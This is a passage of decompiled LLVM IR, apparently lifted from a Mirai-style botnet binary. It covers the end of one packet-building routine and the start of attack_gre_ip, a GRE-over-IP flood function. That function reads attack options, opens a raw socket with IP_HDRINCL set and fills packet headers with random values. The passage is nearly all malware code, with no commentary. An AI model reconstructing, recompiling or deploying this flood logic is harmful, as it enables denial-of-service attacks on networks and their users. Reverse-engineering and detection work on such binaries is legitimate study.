  %v3_804ab20 = inttoptr i32 %v2_804ab20 to i32*
  %v4_804ab20 = load i32, i32* %v3_804ab20, align 4
  %v5_804ab20 = sub i32 %v0_804ab20, %v4_804ab20
  %v11_804ab20 = xor i32 %v4_804ab20, %v0_804ab20
  %v12_804ab20 = xor i32 %v5_804ab20, %v0_804ab20
  %v13_804ab20 = and i32 %v12_804ab20, %v11_804ab20
  %v14_804ab20 = icmp slt i32 %v13_804ab20, 0
  %v16_804ab20 = icmp slt i32 %v5_804ab20, 0
  %v2_804ab24 = icmp eq i1 %v16_804ab20, %v14_804ab20
  br i1 %v2_804ab24, label %dec_label_pc_804ac32, label %dec_label_pc_804ab2a

dec_label_pc_804ab2a:                             ; preds = %dec_label_pc_804aa86, %dec_label_pc_804a9b4
  %v1_804ab2e = phi i32 [ %v0_804ab20, %dec_label_pc_804aa86 ], [ 0, %dec_label_pc_804a9b4 ]
  %v1_804ab3a = phi i32 [ %v1_804ab1d, %dec_label_pc_804aa86 ], [ %v0_804ab2a.pre, %dec_label_pc_804a9b4 ]
  %v1_804ab2a = add i32 %v1_804ab3a, 32
  %v2_804ab2a = inttoptr i32 %v1_804ab2a to i32*
  %v3_804ab2a = load i32, i32* %v2_804ab2a, align 4
  store i32 %v3_804ab2a, i32* %edx.global-to-local, align 4
  %v2_804ab2e = mul i32 %v1_804ab2e, 4
  %v3_804ab2e = add i32 %v3_804ab2a, %v2_804ab2e
  %v4_804ab2e = inttoptr i32 %v3_804ab2e to i32*
  %v5_804ab2e = load i32, i32* %v4_804ab2e, align 4
  store i32 %v5_804ab2e, i32* @esi, align 4
  %v3_804ab31 = mul i32 %v1_804ab2e, 3
  store i32 %v3_804ab31, i32* %eax.global-to-local, align 4
  %v1_804ab34 = add i32 %v5_804ab2e, 24
  store i32 %v1_804ab34, i32* %edx.global-to-local, align 4
  %v1_804ab37 = add i32 %v5_804ab2e, 38
  store i32 %v1_804ab37, i32* @edi, align 4
  %v2_804ab3a = add i32 %v1_804ab3a, 76
  %v3_804ab3a = inttoptr i32 %v2_804ab3a to i32*
  store i32 %v1_804ab34, i32* %v3_804ab3a, align 4
  %v0_804ab3e = load i32, i32* @esp, align 4
  %v1_804ab3e = add i32 %v0_804ab3e, 136
  %v2_804ab3e = inttoptr i32 %v1_804ab3e to i32*
  %v3_804ab3e = load i32, i32* %v2_804ab3e, align 4
  store i32 %v3_804ab3e, i32* %edx.global-to-local, align 4
  %v0_804ab45 = load i32, i32* @esi, align 4
  %v1_804ab45 = add i32 %v0_804ab45, 58
  store i32 %v1_804ab45, i32* @ebp, align 4
  %v1_804ab48 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ab48 = mul i32 %v1_804ab48, 8
  %v3_804ab48 = add i32 %v2_804ab48, %v3_804ab3e
  store i32 %v3_804ab48, i32* %eax.global-to-local, align 4
  %v1_804ab4b = add i32 %v3_804ab48, 20
  %v2_804ab4b = inttoptr i32 %v1_804ab4b to i8*
  %v3_804ab4b = load i8, i8* %v2_804ab4b, align 1
  %tmp71 = icmp ult i8 %v3_804ab4b, 32
  br i1 %tmp71, label %dec_label_pc_804ab55, label %dec_label_pc_804a9c6

dec_label_pc_804ab55:                             ; preds = %dec_label_pc_804ab2a
  %v1_804ab55 = add i32 %v3_804ab48, 16
  %v2_804ab55 = inttoptr i32 %v1_804ab55 to i32*
  %v3_804ab55 = load i32, i32* %v2_804ab55, align 4
  store i32 %v3_804ab55, i32* %ebx.global-to-local, align 4
  %v1_804ab58 = call i32 @rand_next(i32 %v1_804a99a.pre-phi)
  store i32 %v1_804ab58, i32* %eax.global-to-local, align 4
  %v1_804ab5d = trunc i32 %v3_804ab55 to i16
  %v2_804ab5d = call i16 @llvm.bswap.i16(i16 %v1_804ab5d)
  %v3_804ab5d = zext i16 %v2_804ab5d to i32
  %v1_804ab61 = udiv i32 %v3_804ab55, 65536
  %v2_804ab61 = mul nuw i32 %v3_804ab5d, 65536
  %v1_804ab64 = trunc i32 %v1_804ab61 to i16
  %v2_804ab64 = call i16 @llvm.bswap.i16(i16 %v1_804ab64)
  %v3_804ab64 = zext i16 %v2_804ab64 to i32
  %v6_804ab64 = or i32 %v3_804ab64, %v2_804ab61
  store i32 %v6_804ab64, i32* %ebx.global-to-local, align 4
  %v0_804ab68 = load i32, i32* @esp, align 4
  %v1_804ab68 = add i32 %v0_804ab68, 104
  %v2_804ab68 = inttoptr i32 %v1_804ab68 to i32*
  %v3_804ab68 = load i32, i32* %v2_804ab68, align 4
  store i32 %v3_804ab68, i32* %edx.global-to-local, align 4
  %v3_804ab6c = mul i32 %v3_804ab68, 3
  store i32 %v3_804ab6c, i32* %ecx.global-to-local, align 4
  %v1_804ab6f = add i32 %v0_804ab68, 136
  %v2_804ab6f = inttoptr i32 %v1_804ab6f to i32*
  %v3_804ab6f = load i32, i32* %v2_804ab6f, align 4
  store i32 %v3_804ab6f, i32* %edx.global-to-local, align 4
  %v2_804ab76 = mul i32 %v3_804ab68, 24
  %v3_804ab76 = add i32 %v2_804ab76, 20
  %v4_804ab76 = add i32 %v3_804ab76, %v3_804ab6f
  %v5_804ab76 = inttoptr i32 %v4_804ab76 to i8*
  %v6_804ab76 = load i8, i8* %v5_804ab76, align 1
  %v7_804ab76 = zext i8 %v6_804ab76 to i32
  store i32 %v7_804ab76, i32* %ecx.global-to-local, align 4
  %tmp = urem i8 %v6_804ab76, 32
  %v4_804ab80 = icmp eq i8 %tmp, 0
  br i1 %v4_804ab80, label %bb70, label %bb

bb:                                               ; preds = %dec_label_pc_804ab55
  %v2_804ab80 = zext i8 %tmp to i32
  %v5_804ab80 = lshr i32 %v1_804ab58, %v2_804ab80
  store i32 %v5_804ab80, i32* %eax.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_804ab55, %bb
  %v1_804ab82 = phi i32 [ %v1_804ab58, %dec_label_pc_804ab55 ], [ %v5_804ab80, %bb ]
  %v2_804ab82 = add i32 %v1_804ab82, %v6_804ab64
  %v1_804ab84 = trunc i32 %v2_804ab82 to i16
  %v2_804ab84 = call i16 @llvm.bswap.i16(i16 %v1_804ab84)
  %v3_804ab84 = zext i16 %v2_804ab84 to i32
  %v1_804ab88 = udiv i32 %v2_804ab82, 65536
  %v2_804ab88 = mul nuw i32 %v3_804ab84, 65536
  %v1_804ab8b = trunc i32 %v1_804ab88 to i16
  %v2_804ab8b = call i16 @llvm.bswap.i16(i16 %v1_804ab8b)
  %v3_804ab8b = zext i16 %v2_804ab8b to i32
  %v6_804ab8b = or i32 %v3_804ab8b, %v2_804ab88
  store i32 %v6_804ab8b, i32* %ebx.global-to-local, align 4
  %v1_804ab8f = add i32 %v0_804ab68, 44
  %v2_804ab8f = inttoptr i32 %v1_804ab8f to i32*
  %v3_804ab8f = load i32, i32* %v2_804ab8f, align 4
  %v13_804ab8f = icmp eq i32 %v3_804ab8f, -1
  %v1_804ab94 = load i32, i32* @esi, align 4
  %v2_804ab94 = add i32 %v1_804ab94, 16
  %v3_804ab94 = inttoptr i32 %v2_804ab94 to i32*
  store i32 %v6_804ab8b, i32* %v3_804ab94, align 4
  %v1_804ab97 = icmp eq i1 %v13_804ab8f, false
  br i1 %v1_804ab97, label %.dec_label_pc_804a9d1_crit_edge, label %dec_label_pc_804aba0

.dec_label_pc_804a9d1_crit_edge:                  ; preds = %bb70
  %v0_804a9d1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a9d1

dec_label_pc_804aba0:                             ; preds = %bb70, %dec_label_pc_804a9c6
  %v1_804aba0 = call i32 @rand_next(i32 %v1_804a99a.pre-phi)
  store i32 %v1_804aba0, i32* %eax.global-to-local, align 4
  %v0_804aba5 = load i32, i32* @esp, align 4
  %v1_804aba5 = add i32 %v0_804aba5, 56
  %v2_804aba5 = inttoptr i32 %v1_804aba5 to i16*
  %v3_804aba5 = load i16, i16* %v2_804aba5, align 2
  %v13_804aba5 = icmp eq i16 %v3_804aba5, -1
  %v1_804abab = load i32, i32* @esi, align 4
  %v2_804abab = add i32 %v1_804abab, 12
  %v3_804abab = inttoptr i32 %v2_804abab to i32*
  store i32 %v1_804aba0, i32* %v3_804abab, align 4
  %v1_804abae = icmp eq i1 %v13_804aba5, false
  br i1 %v1_804abae, label %dec_label_pc_804aba0.dec_label_pc_804a9dd_crit_edge, label %dec_label_pc_804abb4

dec_label_pc_804aba0.dec_label_pc_804a9dd_crit_edge: ; preds = %dec_label_pc_804aba0
  %v0_804a9dd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a9dd

dec_label_pc_804abb4:                             ; preds = %dec_label_pc_804aba0, %dec_label_pc_804a9d1
  %v1_804abb4 = call i32 @rand_next(i32 %v1_804a99a.pre-phi)
  %v2_804abb4 = trunc i32 %v1_804abb4 to i16
  %v3_804abb9 = load i32, i32* @esi, align 4
  %v4_804abb9 = add i32 %v3_804abb9, 4
  %v5_804abb9 = inttoptr i32 %v4_804abb9 to i16*
  store i16 %v2_804abb4, i16* %v5_804abb9, align 2
  %sext11 = mul i32 %v1_804abb4, 65536
  %v1_804abbd = sdiv i32 %sext11, 65536
  %v7_804abbd = sub nsw i32 999, %v1_804abbd
  store i32 %v7_804abbd, i32* %eax.global-to-local, align 4
  %v1_804abc5 = trunc i32 %v7_804abbd to i16
  %v2_804abc5 = load i32, i32* @edi, align 4
  %v3_804abc5 = add i32 %v2_804abc5, 4
  %v4_804abc5 = inttoptr i32 %v3_804abc5 to i16*
  store i16 %v1_804abc5, i16* %v4_804abc5, align 2
  %v0_804abc9 = load i32, i32* @esp, align 4
  %v1_804abc9 = add i32 %v0_804abc9, 60
  %v2_804abc9 = inttoptr i32 %v1_804abc9 to i16*
  %v3_804abc9 = load i16, i16* %v2_804abc9, align 2
  %v13_804abc9 = icmp eq i16 %v3_804abc9, -1
  %v1_804abcf = icmp eq i1 %v13_804abc9, false
  br i1 %v1_804abcf, label %dec_label_pc_804a9e9, label %dec_label_pc_804abd5

dec_label_pc_804abd5:                             ; preds = %dec_label_pc_804abb4, %dec_label_pc_804a9dd
  %v1_804abd5 = call i32 @rand_next(i32 %v1_804a99a.pre-phi)
  %v2_804abd5 = trunc i32 %v1_804abd5 to i16
  store i32 %v1_804abd5, i32* %eax.global-to-local, align 4
  %v0_804abda = load i32, i32* @esp, align 4
  %v1_804abda = add i32 %v0_804abda, 62
  %v2_804abda = inttoptr i32 %v1_804abda to i16*
  %v3_804abda = load i16, i16* %v2_804abda, align 2
  %v13_804abda = icmp eq i16 %v3_804abda, -1
  %v3_804abe0 = load i32, i32* @esi, align 4
  %v4_804abe0 = add i32 %v3_804abe0, 58
  %v5_804abe0 = inttoptr i32 %v4_804abe0 to i16*
  store i16 %v2_804abd5, i16* %v5_804abe0, align 2
  %v1_804abe4 = icmp eq i1 %v13_804abda, false
  br i1 %v1_804abe4, label %dec_label_pc_804abd5.dec_label_pc_804a9f5_crit_edge, label %dec_label_pc_804abf0

dec_label_pc_804abd5.dec_label_pc_804a9f5_crit_edge: ; preds = %dec_label_pc_804abd5
  %v0_804a9f5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a9f5

dec_label_pc_804abf0:                             ; preds = %dec_label_pc_804abd5, %dec_label_pc_804a9e9
  %v1_804abf0 = call i32 @rand_next(i32 %v1_804a99a.pre-phi)
  %v2_804abf0 = trunc i32 %v1_804abf0 to i16
  store i32 %v1_804abf0, i32* %eax.global-to-local, align 4
  %v0_804abf5 = load i32, i32* @esp, align 4
  %v1_804abf5 = add i32 %v0_804abf5, 71
  %v2_804abf5 = inttoptr i32 %v1_804abf5 to i8*
  %v3_804abf5 = load i8, i8* %v2_804abf5, align 1
  %v4_804abf5 = icmp eq i8 %v3_804abf5, 0
  %v3_804abfa = load i32, i32* @ebp, align 4
  %v4_804abfa = add i32 %v3_804abfa, 2
  %v5_804abfa = inttoptr i32 %v4_804abfa to i16*
  store i16 %v2_804abf0, i16* %v5_804abfa, align 2
  %v1_804abfe = icmp eq i1 %v4_804abf5, false
  br i1 %v1_804abfe, label %dec_label_pc_804aa00, label %dec_label_pc_804ac04

dec_label_pc_804ac04:                             ; preds = %dec_label_pc_804abf0, %dec_label_pc_804a9f5
  %v1_804ac04 = call i32 @rand_next(i32 %v1_804a99a.pre-phi)
  store i32 %v1_804ac04, i32* %eax.global-to-local, align 4
  %v1_804ac09 = load i32, i32* @edi, align 4
  %v2_804ac09 = add i32 %v1_804ac09, 16
  %v3_804ac09 = inttoptr i32 %v2_804ac09 to i32*
  store i32 %v1_804ac04, i32* %v3_804ac09, align 4
  br label %dec_label_pc_804aa06

dec_label_pc_804ac11:                             ; preds = %dec_label_pc_804aa06
  %v0_804ac11 = load i32, i32* @ecx, align 4
  %v2_804ac11 = add i32 %v0_804aa78, 12
  %v3_804ac11 = inttoptr i32 %v2_804ac11 to i32*
  store i32 %v0_804ac11, i32* %v3_804ac11, align 4
  %v0_804ac12 = load i32, i32* @ecx, align 4
  %v2_804ac12 = add i32 %v0_804aa78, 8
  %v3_804ac12 = inttoptr i32 %v2_804ac12 to i32*
  store i32 %v0_804ac12, i32* %v3_804ac12, align 4
  %v1_804ac13 = add i32 %v0_804aa78, 80
  %v2_804ac13 = inttoptr i32 %v1_804ac13 to i32*
  %v3_804ac13 = load i32, i32* %v2_804ac13, align 4
  store i32 %v3_804ac13, i32* %edx.global-to-local, align 4
  %v0_804ac17 = load i32, i32* @ebp, align 4
  %v1_804ac17 = add i32 %v0_804ac17, 8
  store i32 %v1_804ac17, i32* %eax.global-to-local, align 4
  %v2_804ac1a = add i32 %v0_804aa78, 4
  %v3_804ac1a = inttoptr i32 %v2_804ac1a to i32*
  store i32 %v3_804ac13, i32* %v3_804ac1a, align 4
  %v0_804ac1b = load i32, i32* %eax.global-to-local, align 4
  %v3_804ac1b = inttoptr i32 %v0_804aa78 to i32*
  store i32 %v0_804ac1b, i32* %v3_804ac1b, align 4
  %v3_804ac1c = call i32 @rand_alphastr(i8* %v2_804ac1c, i32 %v4_804a6a9)
  store i32 %v3_804ac1c, i32* %eax.global-to-local, align 4
  %v0_804ac21 = load i32, i32* @esp, align 4
  %v1_804ac21 = add i32 %v0_804ac21, 80
  %v2_804ac21 = inttoptr i32 %v1_804ac21 to i32*
  %v3_804ac21 = load i32, i32* %v2_804ac21, align 4
  store i32 %v3_804ac21, i32* %eax.global-to-local, align 4
  %v1_804ac28 = load i32, i32* @ebp, align 4
  %v2_804ac28 = add i32 %v3_804ac21, 8
  %v3_804ac28 = add i32 %v2_804ac28, %v1_804ac28
  %v4_804ac28 = inttoptr i32 %v3_804ac28 to i8*
  store i8 0, i8* %v4_804ac28, align 1
  br label %dec_label_pc_804aa86

dec_label_pc_804ac32:                             ; preds = %dec_label_pc_804aa86, %dec_label_pc_804a9a1
  %v0_804ac32 = phi i32 [ %v0_804a9a9, %dec_label_pc_804a9a1 ], [ %v1_804ab1d, %dec_label_pc_804aa86 ]
  %v1_804ac35 = add i32 %v0_804ac32, -16
  %v2_804ac35 = inttoptr i32 %v1_804ac35 to i32*
  store i32 0, i32* %v2_804ac35, align 4
  %v2_804ac37 = call i32 @__GI_time(i32* %v1_804ac37)
  store i32 %v2_804ac37, i32* %eax.global-to-local, align 4
  %v0_804ac3c = load i32, i32* @esp, align 4
  %v1_804ac3c = add i32 %v0_804ac3c, 16
  %v1_804ac3f = add i32 %v0_804ac3c, 88
  %v2_804ac3f = inttoptr i32 %v1_804ac3f to i32*
  %v3_804ac3f = load i32, i32* %v2_804ac3f, align 4
  %v5_804ac3f = sub i32 %v3_804ac3f, %v2_804ac37
  %v11_804ac3f = xor i32 %v3_804ac3f, %v2_804ac37
  %v12_804ac3f = xor i32 %v5_804ac3f, %v3_804ac3f
  %v13_804ac3f = and i32 %v12_804ac3f, %v11_804ac3f
  %v14_804ac3f = icmp slt i32 %v13_804ac3f, 0
  %v16_804ac3f = icmp slt i32 %v5_804ac3f, 0
  %v2_804ac43 = icmp eq i1 %v16_804ac3f, %v14_804ac3f
  br i1 %v2_804ac43, label %dec_label_pc_804a9a1, label %dec_label_pc_804ac49

dec_label_pc_804ac49:                             ; preds = %dec_label_pc_804ac32
  %v1_804ac49 = add i32 %v0_804ac3c, 124
  %v1_804ac4c = inttoptr i32 %v1_804ac49 to i32*
  %v2_804ac4c = load i32, i32* %v1_804ac4c, align 4
  store i32 %v2_804ac4c, i32* %ebx.global-to-local, align 4
  ret i32 %v2_804ac37

; uselistorder directives
  uselistorder i32 %v5_804ac3f, { 1, 0 }
  uselistorder i32 %v1_804abf0, { 1, 0 }
  uselistorder i32 %v1_804abd5, { 1, 0 }
  uselistorder i32 %v0_804abc9, { 1, 0 }
  uselistorder i32 %v7_804abbd, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 %v0_804ab3e, { 2, 1, 0 }
  uselistorder i32 %v1_804ab2e, { 1, 0 }
  uselistorder i32 %v5_804ab20, { 1, 0 }
  uselistorder i32 %v0_804ab20, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804aa78, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v1_804a99a.pre-phi, { 16, 4, 17, 3, 18, 2, 15, 14, 11, 10, 9, 8, 7, 6, 5, 13, 12, 1, 0 }
  uselistorder i32 %v3_804a96e, { 1, 0 }
  uselistorder i32 %v4_804a8dc, { 1, 0 }
  uselistorder i32 %v4_804a8c2, { 1, 0 }
  uselistorder i32 %v1_804a83b, { 2, 1, 0 }
  uselistorder i32 %v1_804a82c, { 1, 0 }
  uselistorder i32 %v4_804a7f7, { 1, 2, 0 }
  uselistorder i32 %v4_804a7f3, { 1, 2, 0 }
  uselistorder i32 %v3_804a7b6, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_804a755, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v5_804a71e, { 1, 0 }
  uselistorder i8 %v6_804a70c, { 1, 0 }
  uselistorder i32 %v5_804a70c, { 0, 2, 1 }
  uselistorder i32 %v5_804a6e8, { 0, 2, 1 }
  uselistorder i32 %v4_804a6a9, { 5, 9, 7, 6, 4, 3, 2, 1, 8, 10, 11, 0 }
  uselistorder i32* %stack_var_-20, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 8, 9, 10, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 8, 9, 14, 10, 11, 12, 13, 15, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 38, 39, 40, 41, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 42, 43, 44, 51, 52, 53, 54, 55, 56, 57, 58, 45, 46, 47, 48, 49, 50, 59, 60, 61, 62, 63, 64, 65, 66 }
  uselistorder i8 %arg2, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_804aa86, { 1, 0 }
  uselistorder label %dec_label_pc_804a996, { 1, 0 }
  uselistorder label %dec_label_pc_804a98e, { 1, 0 }
  uselistorder label %dec_label_pc_804a957, { 1, 0 }
  uselistorder label %dec_label_pc_804a8f3, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i8 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_804ac63 = load i32, i32* @ebx, align 4
  %v4_804ac69 = zext i8 %arg2 to i32
  %v5_804ac69 = load i32, i32* @eax, align 4
  %v6_804ac69 = and i32 %v5_804ac69, -256
  %v7_804ac69 = or i32 %v6_804ac69, %v4_804ac69
  store i32 %v7_804ac69, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* @esi, align 4
  store i32 %v4_804ac69, i32* %edx.global-to-local, align 4
  %v4_804ac76 = urem i32 %arg4, 256
  store i32 0, i32* %stack_var_-20, align 4
  store i32 %v4_804ac76, i32* @ebx, align 4
  store i32 %v4_804ac69, i32* %stack_var_-124, align 4
  %v2_804ac96 = zext i8 %arg2 to i64
  %v3_804ac96 = call i32 @calloc(i64 %v2_804ac96, i32 4)
  store i32 %v3_804ac96, i32* @eax, align 4
  %v0_804aca3 = load i32, i32* @esi, align 4
  %v0_804aca4 = load i32, i32* @ebx, align 4
  %v4_804aca5 = trunc i32 %v0_804aca4 to i8
  %v5_804aca5 = call i32 @attack_get_opt_int(i8 %v4_804aca5, i32 %v0_804aca3, i32 2, i32 0)
  %v6_804aca5 = trunc i32 %v5_804aca5 to i8
  store i32 %v5_804aca5, i32* @eax, align 4
  %v0_804acb8 = load i32, i32* @esi, align 4
  %v0_804acb9 = load i32, i32* @ebx, align 4
  store i32 %v0_804acb9, i32* %stack_var_-124, align 4
  %v4_804acba = trunc i32 %v0_804acb9 to i8
  %v5_804acba = call i32 @attack_get_opt_int(i8 %v4_804acba, i32 %v0_804acb8, i32 3, i32 65535)
  %v6_804acba = trunc i32 %v5_804acba to i16
  store i32 %v5_804acba, i32* @eax, align 4
  %v0_804acc7 = load i32, i32* @esi, align 4
  %v0_804acc8 = load i32, i32* @ebx, align 4
  %v4_804acc9 = trunc i32 %v0_804acc8 to i8
  %v5_804acc9 = call i32 @attack_get_opt_int(i8 %v4_804acc9, i32 %v0_804acc7, i32 4, i32 64)
  store i32 %v5_804acc9, i32* @eax, align 4
  %v0_804acd9 = load i32, i32* @esi, align 4
  %v0_804acda = load i32, i32* @ebx, align 4
  store i32 %v0_804acda, i32* %stack_var_-124, align 4
  %v4_804acdb = trunc i32 %v0_804acda to i8
  %v5_804acdb = call i32 @attack_get_opt_int(i8 %v4_804acdb, i32 %v0_804acd9, i32 5, i32 1)
  %v6_804acdb = trunc i32 %v5_804acdb to i8
  store i32 %v5_804acdb, i32* @eax, align 4
  %v0_804aceb = load i32, i32* @esi, align 4
  %v0_804acec = load i32, i32* @ebx, align 4
  %v4_804aced = trunc i32 %v0_804acec to i8
  %v5_804aced = call i32 @attack_get_opt_int(i8 %v4_804aced, i32 %v0_804aceb, i32 6, i32 65535)
  %v6_804aced = trunc i32 %v5_804aced to i16
  store i32 %v5_804aced, i32* @eax, align 4
  %v0_804ad00 = load i32, i32* @esi, align 4
  %v0_804ad01 = load i32, i32* @ebx, align 4
  store i32 %v0_804ad01, i32* %stack_var_-124, align 4
  %v4_804ad02 = trunc i32 %v0_804ad01 to i8
  %v5_804ad02 = call i32 @attack_get_opt_int(i8 %v4_804ad02, i32 %v0_804ad00, i32 7, i32 65535)
  store i32 %v5_804ad02, i32* @eax, align 4
  %sext = mul i32 %v5_804ad02, 65536
  %v1_804ad0c = sdiv i32 %sext, 65536
  store i32 %v1_804ad0c, i32* @ebp, align 4
  %v0_804ad10 = load i32, i32* @esi, align 4
  %v0_804ad11 = load i32, i32* @ebx, align 4
  %v4_804ad12 = trunc i32 %v0_804ad11 to i8
  %v5_804ad12 = call i32 @attack_get_opt_int(i8 %v4_804ad12, i32 %v0_804ad10, i32 0, i32 512)
  store i32 %v5_804ad12, i32* @eax, align 4
  %v0_804ad22 = load i32, i32* @esi, align 4
  %v0_804ad23 = load i32, i32* @ebx, align 4
  store i32 %v0_804ad23, i32* %stack_var_-124, align 4
  %v4_804ad24 = trunc i32 %v0_804ad23 to i8
  %v5_804ad24 = call i32 @attack_get_opt_int(i8 %v4_804ad24, i32 %v0_804ad22, i32 1, i32 1)
  %v6_804ad24 = trunc i32 %v5_804ad24 to i8
  store i32 %v5_804ad24, i32* @eax, align 4
  %v0_804ad31 = load i32, i32* @esi, align 4
  %v0_804ad32 = load i32, i32* @ebx, align 4
  %v4_804ad33 = trunc i32 %v0_804ad32 to i8
  %v5_804ad33 = call i32 @attack_get_opt_int(i8 %v4_804ad33, i32 %v0_804ad31, i32 18, i32 0)
  store i32 %v5_804ad33, i32* @eax, align 4
  %v0_804ad3b = load i32, i32* @global_var_805a858.27, align 8
  store i32 %v0_804ad3b, i32* %ecx.global-to-local, align 4
  %sext3 = mul i32 %v5_804ad33, 16777216
  %v1_804ad41 = sdiv i32 %sext3, 16777216
  store i32 %v1_804ad41, i32* @edi, align 4
  %v0_804ad46 = load i32, i32* @esi, align 4
  %v0_804ad47 = load i32, i32* @ebx, align 4
  store i32 %v0_804ad47, i32* %stack_var_-124, align 4
  %v4_804ad48 = trunc i32 %v0_804ad47 to i8
  %v5_804ad48 = call i32 @attack_get_opt_int(i8 %v4_804ad48, i32 %v0_804ad46, i32 24, i32 %v0_804ad3b)
  store i32 %v5_804ad48, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-124, align 4
  %v2_804ad58 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_804ad64 = add i32 %v2_804ad58, %arg1
  store i32 %v2_804ad64, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-124, align 4
  %v3_804ad73 = call i32 @socket(i32 2, i32 3, i32 6)
  %v1_804ad7f = add i32 %v3_804ad73, 1
  %v8_804ad7f = icmp eq i32 %v1_804ad7f, 0
  store i32 %v1_804ad7f, i32* %eax.global-to-local, align 4
  br i1 %v8_804ad7f, label %dec_label_pc_804af35, label %dec_label_pc_804ad86

dec_label_pc_804ad86:                             ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  store i32 4, i32* %stack_var_-124, align 4
  %v2_804ad93 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804ad93, i32* %eax.global-to-local, align 4
  store i32 %v3_804ad73, i32* @esi, align 4
  %v5_804ada1 = call i32 @__GI_setsockopt(i32 %v3_804ad73, i32 0, i32 3, i32 %v2_804ad93, i32 4)
  %v1_804ada9 = add i32 %v5_804ada1, 1
  %v8_804ada9 = icmp eq i32 %v1_804ada9, 0
  store i32 %v1_804ada9, i32* @eax, align 4
  br i1 %v8_804ada9, label %dec_label_pc_804af25, label %dec_label_pc_804adb0

dec_label_pc_804adb0:                             ; preds = %dec_label_pc_804ad86
  %sext4 = mul i32 %v5_804acba, 65536
  %v4_804adb0 = sdiv i32 %sext4, 65536
  store i32 %v4_804adb0, i32* %ecx.global-to-local, align 4
  %sext5 = mul i32 %v5_804aced, 65536
  %v4_804adb4 = sdiv i32 %sext5, 65536
  store i32 %v4_804adb4, i32* %eax.global-to-local, align 4
  %v0_804adb8 = load i32, i32* @edi, align 4
  store i32 %v0_804adb8, i32* %edx.global-to-local, align 4
  %v0_804adc4 = load i32, i32* @ebp, align 4
  %v1_804adc4 = trunc i32 %v0_804adc4 to i16
  %v1_804adc9 = trunc i32 %v0_804adb8 to i8
  store i32 0, i32* %stack_var_-20, align 4
  %v4_804add5 = icmp eq i8 %arg2, 0
  br i1 %v4_804add5, label %dec_label_pc_804adb0.dec_label_pc_804af3d_crit_edge, label %dec_label_pc_804ade0

dec_label_pc_804adb0.dec_label_pc_804af3d_crit_edge: ; preds = %dec_label_pc_804adb0
  %.pre = add i32 %v5_804ad12, 8
  %.pre20 = add i32 %v5_804ad12, 52
  br label %dec_label_pc_804af3d

dec_label_pc_804ade0:                             ; preds = %dec_label_pc_804adb0
  %v1_804ade6 = sub nsw i32 -1, %v4_804adb0
  store i32 %v1_804ade6, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804adeb = add i32 %v5_804ad12, 28
  %v1_804adee = add i32 %v5_804ad12, 52
  %v1_804adf1 = add i32 %v5_804ad12, 8
  store i32 %v1_804adf1, i32* %eax.global-to-local, align 4
  %v1_804adf4 = trunc i32 %v1_804adeb to i16
  %v1_804ae02 = trunc i32 %v1_804adf1 to i16
  %v2_804ae07 = call i16 @llvm.bswap.i16(i16 %v6_804acba)
  %v3_804ae07 = zext i16 %v2_804ae07 to i32
  %v5_804ae07 = and i32 %v4_804adb0, -65536
  %v6_804ae07 = or i32 %v3_804ae07, %v5_804ae07
  store i32 %v6_804ae07, i32* %ecx.global-to-local, align 4
  %v1_804ae0b = trunc i32 %v1_804adee to i16
  %v2_804ae0b = call i16 @llvm.bswap.i16(i16 %v1_804ae0b)
  %v3_804ae0b = zext i16 %v2_804ae0b to i32
  %v5_804ae0b = and i32 %v1_804adee, -65536
  %v6_804ae0b = or i32 %v3_804ae0b, %v5_804ae0b
  store i32 %v6_804ae0b, i32* @ebp, align 4
  %v4_804ae76 = urem i32 %v5_804aca5, 256
  %v4_804ae90 = urem i32 %v5_804acc9, 256
  %v4_804ae9a = icmp eq i8 %v6_804acdb, 0
  %v3_804aebf = add i32 %arg3, 16
  %v2_804aeda = call i16 @llvm.bswap.i16(i16 %v1_804adf4)
  %v1_804aee9 = trunc i32 %v1_804ade6 to i16
  %v2_804aee9 = call i16 @llvm.bswap.i16(i16 %v1_804aee9)
  %v3_804aee9 = zext i16 %v2_804aee9 to i32
  %v5_804aee9 = and i32 %v1_804ade6, -65536
  %v6_804aee9 = or i32 %v3_804aee9, %v5_804aee9
  %v4_804af07 = icmp eq i8 %v1_804adc9, 0
  %v1_804ae25 = trunc i32 %v4_804adb4 to i16
  %v2_804ae25 = call i16 @llvm.bswap.i16(i16 %v1_804ae25)
  %v3_804ae25 = zext i16 %v2_804ae25 to i32
  %v5_804ae25 = and i32 %v4_804adb4, -65536
  %v6_804ae25 = or i32 %v3_804ae25, %v5_804ae25
